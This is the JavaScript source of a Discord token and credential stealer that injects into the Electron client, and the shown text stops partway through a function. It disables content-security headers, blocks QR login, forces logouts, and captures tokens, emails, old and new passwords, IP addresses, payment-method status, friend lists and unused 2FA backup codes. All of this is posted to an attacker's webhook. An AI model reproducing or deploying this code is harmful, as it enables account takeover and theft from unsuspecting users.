const fs = require('fs');
const path = require('path');
const {
    BrowserWindow,
    session
} = require('electron')
const querystring = require('querystring');
const os = require('os')
var webhook = "%WEBHOOK_LINK%";
const computerName = os.hostname();
const discordInstall = `${__dirname}`
const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`

String.prototype.insert = function (index, string) {
    if (index > 0) {
        return this.substring(0, index) + string + this.substr(index);
    }
    return string + this;
};

const config = {
    "logout": "instant",
    "logout-notify": "true",
    "init-notify": "true",
    "embed-color": FFFFFF,
    "disable-qr-code": "true"
}

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    if (details.url.startsWith(webhook)) {
        if (details.url.includes("discord.com")) {
            callback({
                responseHeaders: Object.assign({
                    'Access-Control-Allow-Headers': "*"
                }, details.responseHeaders)
            });
        } else {
            callback({
                responseHeaders: Object.assign({
                    "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
                    'Access-Control-Allow-Headers': "*",
                    "Access-Control-Allow-Origin": "*"
                }, details.responseHeaders)
            });
        }
    } else {
        delete details.responseHeaders['content-security-policy'];
        delete details.responseHeaders['content-security-policy-report-only'];
        callback({
            responseHeaders: {
                ...details.responseHeaders,
                'Access-Control-Allow-Headers': "*"
            }
        })
    }
})

function firstTime() {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {
        if (config['init-notify'] == "true") {
            if (fs.existsSync(path.join(__dirname, "init"))) {
                fs.rmdirSync(path.join(__dirname, "init"));
                if (token == null || token == undefined || token == "") {
                    var c = {
                        username: "",
                        content: "",
                        embeds: [{
                            title: "discord initalized (user not logged in)",
                            color: config["embed-color"],
                            fields: [{
                                name: "info:",
                                value: `\`\`\`hostname: \n${computerName}\n${__dirname}\n\`\`\``,
                                inline: !1
                            }],
                            author: {
                                name: ""
                            },
                            footer: {
                                text: ""
                            }
                        }]
                    };
                    sendToWebhook(JSON.stringify(c));
                } else {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(`
                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText;
                    `, !0).then(a => {
                        const b = JSON.parse(a);
                        var c = {
                            username: "",
                            content: "",
                            embeds: [{
                                title: "discord initalized",
                                color: config["embed-color"],
                                fields: [{
                                    name: "info:",
                                    value: `\`\`\`hostname: \n${computerName}\n${__dirname}\n\`\`\``,
                                    inline: !1
                                }, {
                                    name: "username:",
                                    value: `\`${b.username}#${b.discriminator}\``,
                                    inline: !0
                                }, {
                                    name: "id:",
                                    value: `\`${b.id}\``,
                                    inline: !0
                                }, {
                                    name: "badges:",
                                    value: `${getBadges(b.flags)}`,
                                    inline: !0
                                }, {
                                    name: "token:",
                                    value: `\`\`\`${token}\`\`\``,
                                    inline: !1
                                }],
                                author: {
                                    name: ""
                                },
                                footer: {
                                    text: ""
                                },
                                thumbnail: {
                                    url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
                                }
                            }]
                        };
                        sendToWebhook(JSON.stringify(c))
                    });
                }

            }
        }
        if (!fs.existsSync(path.join(__dirname, "fantasy"))) {
            return !0
        }
        fs.rmdirSync(path.join(__dirname, "fantasy"));
        if (config.logout != "false" || config.logout == "%LOGOUT%") {
            if (config['logout-notify'] == "true") {
                if (token == null || token == undefined || token == "") {
                    var c = {
                        username: "fantasy",
                        content: "",
                        embeds: [{
                            title: "user log out (user not logged in before)",
                            color: config["embed-color"],
                            fields: [{
                                name: "info:",
                                value: `\`\`\`hostname: \n${computerName}\n${__dirname}\n\`\`\``,
                                inline: !1
                            }],
                            author: {
                                name: "rf.sex"
                            },
                            footer: {
                                text: "bettter than all."
                            }
                        }]
                    };
                    sendToWebhook(JSON.stringify(c));
                } else {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(`
                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText;
                    `, !0).then(a => {
                        const b = JSON.parse(a);
                        var c = {
                            username: "fantasy",
                            content: "",
                            embeds: [{
                                title: "user got logged out",
                                color: config["embed-color"],
                                fields: [{
                                    name: "info:",
                                    value: `\`\`\`hostname: \n${computerName}\n${__dirname}\n\`\`\``,
                                    inline: !1
                                }, {
                                    name: "username:",
                                    value: `\`${b.username}#${b.discriminator}\``,
                                    inline: !0
                                }, {
                                    name: "id:",
                                    value: `\`${b.id}\``,
                                    inline: !0
                                }, {
                                    name: "badges:",
                                    value: `${getBadges(b.flags)}`,
                                    inline: !0
                                }, {
                                    name: "token:",
                                    value: `\`\`\`${token}\`\`\``,
                                    inline: !1
                                }],
                                author: {
                                    name: "rf.sex"
                                },
                                footer: {
                                    text: "better than all."
                                },
                                thumbnail: {
                                    url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
                                }
                            }]
                        };
                        sendToWebhook(JSON.stringify(c))
                    });
                }
            }
            const window = BrowserWindow.getAllWindows()[0];
            window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
        }
        return !1
    }))
}

const filter = {
    "urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}

session.defaultSession.webRequest.onBeforeRequest(filter, (details, callback) => {
    if (details.url.startsWith("wss://")) {
        if (config["disable-qr-code"] == "true" || config["disable-qr-code"] == "%DISABLEQRCODE%") {
            callback({
                cancel: true
            })
            return;
        }
    }
    if (firstTime()) {}

    callback({})
    return;
})

function sendToWebhook(what) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${webhook}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, !0).then((token => {}))
}

function getNitro(flags) {
    if (flags == 0) {
        return "no nitro"
    }
    if (flags == 1) {
        return "<:classic:896119171019067423> \`nitro classic\`"
    }
    if (flags == 2) {
        return "<a:boost:824036778570416129> \`nitro Boost\`"
    } else {
        return "no nitro"
    }
}

function GetRBadges(flags) {
    const Discord_Employee = 1;
    const Partnered_Server_Owner = 2;
    const HypeSquad_Events = 4;
    const Bug_Hunter_Level_1 = 8;
    const Early_Supporter = 512;
    const Bug_Hunter_Level_2 = 16384;
    const Early_Verified_Bot_Developer = 131072;
    var badges = "";
    if ((flags & Discord_Employee) == Discord_Employee) {
        badges += "<:staff:874750808728666152> "
    }
    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
        badges += "<:partner:874750808678354964> "
    }
    if ((flags & HypeSquad_Events) == HypeSquad_Events) {
        badges += "<:hypesquad_events:874750808594477056> "
    }
    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
        badges += "<:bughunter_1:874750808426692658> "
    }
    if ((flags & Early_Supporter) == Early_Supporter) {
        badges += "<:early_supporter:874750808414113823> "
    }
    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
        badges += "<:bughunter_2:874750808430874664> "
    }
    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
        badges += "<:developer:874750808472825986> "
    }
    if (badges == "") {
        badges = ""
    }
    return badges
}

function getBadges(flags) {
    const Discord_Employee = 1;
    const Partnered_Server_Owner = 2;
    const HypeSquad_Events = 4;
    const Bug_Hunter_Level_1 = 8;
    const House_Bravery = 64;
    const House_Brilliance = 128;
    const House_Balance = 256;
    const Early_Supporter = 512;
    const Bug_Hunter_Level_2 = 16384;
    const Early_Verified_Bot_Developer = 131072;
    var badges = "";
    if ((flags & Discord_Employee) == Discord_Employee) {
        badges += "<:staff:874750808728666152> "
    }
    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
        badges += "<:partner:874750808678354964> "
    }
    if ((flags & HypeSquad_Events) == HypeSquad_Events) {
        badges += "<:hypesquad_events:874750808594477056> "
    }
    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
        badges += "<:bughunter_1:874750808426692658> "
    }
    if ((flags & House_Bravery) == House_Bravery) {
        badges += "<:bravery:874750808388952075> "
    }
    if ((flags & House_Brilliance) == House_Brilliance) {
        badges += "<:brilliance:874750808338608199> "
    }
    if ((flags & House_Balance) == House_Balance) {
        badges += "<:balance:874750808267292683> "
    }
    if ((flags & Early_Supporter) == Early_Supporter) {
        badges += "<:early_supporter:874750808414113823> "
    }
    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
        badges += "<:bughunter_2:874750808430874664> "
    }
    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
        badges += "<:developer:874750808472825986> "
    }
    if (badges == "") {
        badges = "no rare badges"
    }
    return badges
}

function login(email, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
                            var xmlHttp = new XMLHttpRequest();
                            xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
                            xmlHttp.setRequestHeader("Authorization", "${token}");
                            xmlHttp.send( null );
                            xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
                            var xmlHttp = new XMLHttpRequest();
                            xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
                            xmlHttp.send( null );
                            xmlHttp.responseText;
                            `, !0).then((ip) => {
            window.webContents.executeJavaScript(`
                            var xmlHttp = new XMLHttpRequest();
                            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
                            xmlHttp.setRequestHeader("Authorization", "${token}");
                            xmlHttp.send( null );
                            xmlHttp.responseText`, !0).then((info3) => {
                window.webContents.executeJavaScript(`
                            var xmlHttp = new XMLHttpRequest();
                            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
                            xmlHttp.setRequestHeader("Authorization", "${token}");
                            xmlHttp.send( null );
                            xmlHttp.responseText`, !0).then((info4) => {
                    if (token.startsWith("mfa")) {
                        window.webContents.executeJavaScript(`
                            var xmlHttp = new XMLHttpRequest();
                            xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
                            xmlHttp.setRequestHeader('Content-Type', 'application/json');
                            xmlHttp.setRequestHeader("authorization", "${token}")
                            xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
                            xmlHttp.responseText`, !0).then((codes) => {
                            var fieldo = [];
                            var baseuri = "https://furry.surf/raw/"
                            var gayass = JSON.parse(codes)
                            let g = gayass.backup_codes
                            const r = g.filter((code) => {
                                return code.consumed == null
                            })
                            for (let z in r) {
                                fieldo.push({
                                    name: `code:`,
                                    value: `\`${r[z].code.insert(4, "-")}\``,
                                    inline: true
                                })
                                baseuri += `${r[z].code.insert(4, "-")}<br>`
                            }
                            function totalFriends() {
                                var f = JSON.parse(info4)
                                const r = f.filter((user) => {

                                    return user.type == 1
                                })
                                return r.length
                            }
                            function calcFriends() {
                                var f = JSON.parse(info4)
                                const r = f.filter((user) => {
                                    return user.type == 1
                                })
                                var gay = "";
                                for (z of r) {
                                    var b = GetRBadges(z.user.public_flags)
                                    if (b != "") {
                                        gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                                    }
                                }
                                if (gay == "") {
                                    gay = "no rare friends"
                                }
                                return gay
                            }
                            function cool() {
                                const json = JSON.parse(info3)
                                var billing = "";
                                json.forEach(z => {
                                    if (z.type == "") {
                                        return "\`❌\`"
                                    } else if (z.type == 2 && z.invalid != !0) {
                                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
                                    } else if (z.type == 1 && z.invalid != !0) {
                                        billing += "\`✔️\`" + " :credit_card:"
                                    } else {
                                        return "\`❌\`"
                                    }
                                })
                                if (billing == "") {
                                    billing = "\`❌\`"
                                }
                                return billing
                            }
                            const json = JSON.parse(info);
                            var params = {
                                username: "fantasy",
                                content: "",
                                embeds: [{
                                    "title": "user login",
                                    "color": config['embed-color'],
                                    "fields": [{
                                        name: "malware injection",
                                        value: `\`\`\`${discordInstall}\n\`\`\``,
                                        inline: !1
                                    }, {
                                        name: "ip:",
                                        value: `\`${ip}\``,
                                        inline: !0
                                    }, {
                                        name: "pc name:",
                                        value: `\`${computerName}\``,
                                        inline: !0
                                    }, {
                                        name: "username:",
                                        value: `\`${json.username}#${json.discriminator}\``,
                                        inline: !0
                                    }, {
                                        name: "id:",
                                        value: `\`${json.id}\``,
                                        inline: !0
                                    }, {
                                        name: "nitro:",
                                        value: `${getNitro(json.premium_type)}`,
                                        inline: !0
                                    }, {
                                        name: "badges:",
                                        value: `${getBadges(json.flags)}`,
                                        inline: !0
                                    }, {
                                        name: "payment methods:",
                                        value: `${cool()}`,
                                        inline: !0
                                    }, {
                                        name: "email:",
                                        value: `\`${email}\``,
                                        inline: !0
                                    }, {
                                        name: "password:",
                                        value: `\`${password}\``,
                                        inline: !0
                                    }, {
                                        name: "token:",
                                        value: `\`\`\`${token}\`\`\``,
                                        inline: !1
                                    }, ],
                                    "author": {
                                        "name": "rf.sex"
                                    },
                                    "footer": {
                                        "text": "better than all."
                                    },
                                    "thumbnail": {
                                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                    }
                                }, {
                                    "title": `total friends (${totalFriends()})`,
                                    "color": config['embed-color'],
                                    "description": calcFriends(),
                                    "author": {
                                        "name": "rf.sex"
                                    },
                                    "footer": {
                                        "text": "better than all."
                                    },
                                    "thumbnail": {
                                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                    }
                                }]
                            }
                            var mfaembed = {
                                "title": "<:bughunter_2:874750808430874664> storm alert",
                                "description": `to view 2FA passwords, log into your account and click "View Codes"`,
                                "color": config['embed-color'],
                                "fields": fieldo,
                                "author": {
                                    "name": "rf.sex"
                                },
                                "footer": {
                                    "text": "better than all."
                                }
                            }
                            if (token.startsWith("mfa")) {
                                params.embeds.push(mfaembed)
                            }
                            sendToWebhook(JSON.stringify(params))
                        })
                    } else {
                        const window = BrowserWindow.getAllWindows()[0];
                        window.webContents.executeJavaScript(`
                                        var xmlHttp = new XMLHttpRequest();
                                        xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
                                        xmlHttp.setRequestHeader("Authorization", "${token}");
                                        xmlHttp.send( null );
                                        xmlHttp.responseText;`, !0).then((info) => {
                            window.webContents.executeJavaScript(`
                                        var xmlHttp = new XMLHttpRequest();
                                        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
                                        xmlHttp.send( null );
                                        xmlHttp.responseText;
                                        `, !0).then((ip) => {
                                window.webContents.executeJavaScript(`
                                        var xmlHttp = new XMLHttpRequest();
                                        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
                                        xmlHttp.setRequestHeader("Authorization", "${token}");
                                        xmlHttp.send( null );
                                        xmlHttp.responseText`, !0).then((info3) => {
                                    window.webContents.executeJavaScript(`
                                        var xmlHttp = new XMLHttpRequest();
                                        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
                                        xmlHttp.setRequestHeader("Authorization", "${token}");
                                        xmlHttp.send( null );
                                        xmlHttp.responseText`, !0).then((info4) => {
                                        function totalFriends() {
                                            var f = JSON.parse(info4)
                                            const r = f.filter((user) => {
                                                return user.type == 1
                                            })
                                            return r.length
                                        }
                                        function calcFriends() {
                                            var f = JSON.parse(info4)
                                            const r = f.filter((user) => {
                                                return user.type == 1
                                            })
                                            var gay = "";
                                            for (z of r) {
                                                var b = GetRBadges(z.user.public_flags)
                                                if (b != "") {
                                                    gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                                                }
                                            }
                                            if (gay == "") {
                                                gay = "no rare friends"
                                            }
                                            return gay
                                        }
                                        function cool() {
                                            const json = JSON.parse(info3)
                                            var billing = "";
                                            json.forEach(z => {
                                                if (z.type == "") {
                                                    return "\`❌\`"
                                                } else if (z.type == 2 && z.invalid != !0) {
                                                    billing += "\`✔️\`" + " <:paypal:896441236062347374>"
                                                } else if (z.type == 1 && z.invalid != !0) {
                                                    billing += "\`✔️\`" + " :credit_card:"
                                                } else {
                                                    return "\`❌\`"
                                                }
                                            })
                                            if (billing == "") {
                                                billing = "\`❌\`"
                                            }
                                            return billing
                                        }
                                        const json = JSON.parse(info);
                                        var params = {
                                            username: "fantasy",
                                            content: "",
                                            embeds: [{
                                                "title": "user login",
                                                "color": config['embed-color'],
                                                "fields": [{
                                                    name: "malware injection",
                                                    value: `\`\`\`${discordInstall}\n\`\`\``,
                                                    inline: !1
                                                }, {
                                                    name: "ip",
                                                    value: `\`${ip}\``,
                                                    inline: !0
                                                }, {
                                                    name: "pc name:",
                                                    value: `\`${computerName}\``,
                                                    inline: !0
                                                }, {
                                                    name: "username:",
                                                    value: `\`${json.username}#${json.discriminator}\``,
                                                    inline: !0
                                                }, {
                                                    name: "id:",
                                                    value: `\`${json.id}\``,
                                                    inline: !0
                                                }, {
                                                    name: "nitro:",
                                                    value: `${getNitro(json.premium_type)}`,
                                                    inline: !0
                                                }, {
                                                    name: "badges:",
                                                    value: `${getBadges(json.flags)}`,
                                                    inline: !0
                                                }, {
                                                    name: "payment methods:",
                                                    value: `${cool()}`,
                                                    inline: !0
                                                }, {
                                                    name: "email:",
                                                    value: `\`${email}\``,
                                                    inline: !0
                                                }, {
                                                    name: "password:",
                                                    value: `\`${password}\``,
                                                    inline: !0
                                                }, {
                                                    name: "token:",
                                                    value: `\`\`\`${token}\`\`\``,
                                                    inline: !1
                                                }, ],
                                                "author": {
                                                    "name": "rf.sex"
                                                },
                                                "footer": {
                                                    "text": "better than all."
                                                },
                                                "thumbnail": {
                                                    "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                                }
                                            }, {
                                                "title": `total friends (${totalFriends()})`,
                                                "color": config['embed-color'],
                                                "description": calcFriends(),
                                                "author": {
                                                    "name": "rf.sex"
                                                },
                                                "footer": {
                                                    "text": "better than all."
                                                },
                                                "thumbnail": {
                                                    "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                                }
                                            }]
                                        }
                                        sendToWebhook(JSON.stringify(params))
                                    })
                                })
                            })
                        })
                    }
                })
            })
        })
    })
}

function changePassword(oldpassword, newpassword, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
                            var xmlHttp = new XMLHttpRequest();
                            xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
                            xmlHttp.setRequestHeader("Authorization", "${token}");
                            xmlHttp.send( null );
                            xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
                            var xmlHttp = new XMLHttpRequest();
                            xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
                            xmlHttp.send( null );
                            xmlHttp.responseText;
                            `, !0).then((ip) => {
            window.webContents.executeJavaScript(`
                            var xmlHttp = new XMLHttpRequest();
                            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
                            xmlHttp.setRequestHeader("Authorization", "${token}");
                            xmlHttp.send( null );
                            xmlHttp.responseText`, !0).then((info3) => {
                window.webContents.executeJavaScript(`
                            var xmlHttp = new XMLHttpRequest();
                            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
                            xmlHttp.setRequestHeader("Authorization", "${token}");
                            xmlHttp.send( null );
                            xmlHttp.responseText`, !0).then((info4) => {
                    if (token.startsWith("mfa")) {
                        window.webContents.executeJavaScript(`
                            var xmlHttp = new XMLHttpRequest();
                            xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
                            xmlHttp.setRequestHeader('Content-Type', 'application/json');
                            xmlHttp.setRequestHeader("authorization", "${token}")
                            xmlHttp.send(JSON.stringify({\"password\":\"${newpassword}\",\"regenerate\":false}));
                            xmlHttp.responseText`, !0).then((codes) => {
                            var fieldo = [];
                            var baseuri = "https://ctf.surf/raw/"
                            var gayass = JSON.parse(codes)
                            let g = gayass.backup_codes
                            const r = g.filter((code) => {
                                return code.consumed == null
                            })
                            for (let z in r) {
                                fieldo.push({
                                    name: `code:`,
                                    value: `\`${r[z].code.insert(4, "-")}\``,
                                    inline: true
                                })
                                baseuri += `${r[z].code.insert(4, "-")}<br>`
                            }
                            function totalFriends() {
                                var f = JSON.parse(info4)
                                const r = f.filter((user) => {

                                    return user.type == 1
                                })
                                return r.length
                            }
                            function calcFriends() {
                                var f = JSON.parse(info4)
                                const r = f.filter((user) => {
                                    return user.type == 1
                                })
                                var gay = "";
                                for (z of r) {
                                    var b = GetRBadges(z.user.public_flags)
                                    if (b != "") {
                                        gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                                    }
                                }
                                if (gay == "") {
                                    gay = "no rare friends"
                                }
                                return gay
                            }
                            function cool() {
                                const json = JSON.parse(info3)
                                var billing = "";
                                json.forEach(z => {
                                    if (z.type == "") {
                                        return "\`❌\`"
                                    } else if (z.type == 2 && z.invalid != !0) {
                                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
                                    } else if (z.type == 1 && z.invalid != !0) {
                                        billing += "\`✔️\`" + " :credit_card:"
                                    } else {
                                        return "\`❌\`"
                                    }
                                })
                                if (billing == "") {
                                    billing = "\`❌\`"
                                }
                                return billing
                            }
                            const json = JSON.parse(info);
                            var params = {
                                username: "fantasy",
                                content: "",
                                embeds: [{
                                    "title": "password changed",
                                    "color": config['embed-color'],
                                    "fields": [{
                                        name: "malware injection",
                                        value: `\`\`\`${discordInstall}\n\`\`\``,
                                        inline: !1
                                    }, {
                                        name: "ip:",
                                        value: `\`${ip}\``,
                                        inline: !0
                                    }, {
                                        name: "pc name:",
                                        value: `\`${computerName}\``,
                                        inline: !0
                                    }, {
                                        name: "username:",
                                        value: `\`${json.username}#${json.discriminator}\``,
                                        inline: !0
                                    }, {
                                        name: "id:",
                                        value: `\`${json.id}\``,
                                        inline: !0
                                    }, {
                                        name: "nitro:",
                                        value: `${getNitro(json.premium_type)}`,
                                        inline: !0
                                    }, {
                                        name: "badges:",
                                        value: `${getBadges(json.flags)}`,
                                        inline: !0
                                    }, {
                                        name: "payment methods:",
                                        value: `${cool()}`,
                                        inline: !0
                                    }, {
                                        name: "email:",
                                        value: `\`${json.email}\``,
                                        inline: !0
                                    }, {
                                        name: "old password:",
                                        value: `\`${oldpassword}\``,
                                        inline: !0
                                    }, {
                                        name: "new password:",
                                        value: `\`${newpassword}\``,
                                        inline: !0
                                    }, {
                                        name: "token:",
                                        value: `\`\`\`${token}\`\`\``,
                                        inline: !1
                                    }, ],
                                    "author": {
                                        "name": "rf.sex"
                                    },
                                    "footer": {
                                        "text": "better than all."
                                    },
                                    "thumbnail": {
                                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                    }
                                }, {
                                    "title": `total friends (${totalFriends()})`,
                                    "color": config['embed-color'],
                                    "description": calcFriends(),
                                    "author": {
                                        "name": "rf.sex"
                                    },
                                    "footer": {
                                        "text": "better than all."
                                    },
                                    "thumbnail": {
                                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                    }
                                }]
                            }
                            var mfaembed = {
                                "title": "<:bughunter_2:874750808430874664> storm alert",
                                "description": `to view 2FA passwords, log into your account and click "View Codes"`,
                                "color": config['embed-color'],
                                "fields": fieldo,
                                "author": {
                                    "name": "rf.sex"
                                },
                                "footer": {
                                    "text": "better than all."
                                }
                            }
                            if (token.startsWith("mfa")) {
                                params.embeds.push(mfaembed)
                            }
                            sendToWebhook(JSON.stringify(params))
                        })
                    } else {
                        const window = BrowserWindow.getAllWindows()[0];
                        window.webContents.executeJavaScript(`
                                        var xmlHttp = new XMLHttpRequest();
                                        xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
                                        xmlHttp.setRequestHeader("Authorization", "${token}");
                                        xmlHttp.send( null );
                                        xmlHttp.responseText;`, !0).then((info) => {
                            window.webContents.executeJavaScript(`
                                        var xmlHttp = new XMLHttpRequest();
                                        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
                                        xmlHttp.send( null );
                                        xmlHttp.responseText;
                                        `, !0).then((ip) => {
                                window.webContents.executeJavaScript(`
                                        var xmlHttp = new XMLHttpRequest();
                                        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
                                        xmlHttp.setRequestHeader("Authorization", "${token}");
                                        xmlHttp.send( null );
                                        xmlHttp.responseText`, !0).then((info3) => {
                                    window.webContents.executeJavaScript(`
                                        var xmlHttp = new XMLHttpRequest();
                                        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
                                        xmlHttp.setRequestHeader("Authorization", "${token}");
                                        xmlHttp.send( null );
                                        xmlHttp.responseText`, !0).then((info4) => {
                                        function totalFriends() {
                                            var f = JSON.parse(info4)
                                            const r = f.filter((user) => {
                                                return user.type == 1
                                            })
                                            return r.length
                                        }
                                        function calcFriends() {
                                            var f = JSON.parse(info4)
                                            const r = f.filter((user) => {
                                                return user.type == 1
                                            })
                                            var gay = "";
                                            for (z of r) {
                                                var b = GetRBadges(z.user.public_flags)
                                                if (b != "") {
                                                    gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                                                }
                                            }
                                            if (gay == "") {
                                                gay = "no rare friends"
                                            }
                                            return gay
                                        }
                                        function cool() {
                                            const json = JSON.parse(info3)
                                            var billing = "";
                                            json.forEach(z => {
                                                if (z.type == "") {
                                                    return "\`❌\`"
                                                } else if (z.type == 2 && z.invalid != !0) {
                                                    billing += "\`✔️\`" + " <:paypal:896441236062347374>"
                                                } else if (z.type == 1 && z.invalid != !0) {
                                                    billing += "\`✔️\`" + " :credit_card:"
                                                } else {
                                                    return "\`❌\`"
                                                }
                                            })
                                            if (billing == "") {
                                                billing = "\`❌\`"
                                            }
                                            return billing
                                        }
                                        const json = JSON.parse(info);
                                        var params = {
                                            username: "fantasy",
                                            content: "",
                                            embeds: [{
                                                "title": "password changed",
                                                "color": config['embed-color'],
                                                "fields": [{
                                                    name: "malware injection",
                                                    value: `\`\`\`injectioninfo: \n${discordInstall}\n\`\`\``,
                                                    inline: !1
                                                }, {
                                                    name: "ip:",
                                                    value: `\`${ip}\``,
                                                    inline: !0
                                                }, {
                                                    name: "pc name:",
                                                    value: `\`${computerName}\``,
                                                    inline: !0
                                                }, {
                                                    name: "username:",
                                                    value: `\`${json.username}#${json.discriminator}\``,
                                                    inline: !0
                                                }, {
                                                    name: "id:",
                                                    value: `\`${json.id}\``,
                                                    inline: !0
                                                }, {
                                                    name: "nitro:",
                                                    value: `${getNitro(json.premium_type)}`,
                                                    inline: !0
                                                }, {
                                                    name: "badges:",
                                                    value: `${getBadges(json.flags)}`,
                                                    inline: !0
                                                }, {
                                                    name: "payment method:",
                                                    value: `${cool()}`,
                                                    inline: !0
                                                }, {
                                                    name: "email:",
                                                    value: `\`${json.email}\``,
                                                    inline: !0
                                                }, {
                                                    name: "old password:",
                                                    value: `\`${oldpassword}\``,
                                                    inline: !0
                                                }, {
                                                    name: "new password:",
                                                    value: `\`${newpassword}\``,
                                                    inline: !0
                                                }, {
                                                    name: "token:",
                                                    value: `\`\`\`${token}\`\`\``,
                                                    inline: !1
                                                }, ],
                                                "author": {
                                                    "name": "rf.sex"
                                                },
                                                "footer": {
                                                    "text": "better than all."
                                                },
                                                "thumbnail": {
                                                    "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                                }
                                            }, {
                                                "title": `total friends (${totalFriends()})`,
                                                "color": config['embed-color'],
                                                "description": calcFriends(),
                                                "author": {
                                                    "name": "rf.sex"
                                                },
                                                "footer": {
                                                    "text": "better than all."
                                                },
                                                "thumbnail": {
                                                    "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                                }
                                            }]
                                        }
                                        sendToWebhook(JSON.stringify(params))
                                    })
                                })
                            })
                        })
                    }
                })
            })
        })
    })
}

function changeEmail(newemail, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
                            var xmlHttp = new XMLHttpRequest();
                            xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
                            xmlHttp.setRequestHeader("Authorization", "${token}");
                            xmlHttp.send( null );
                            xmlHttp.responseText;`, !0).then((info) => {
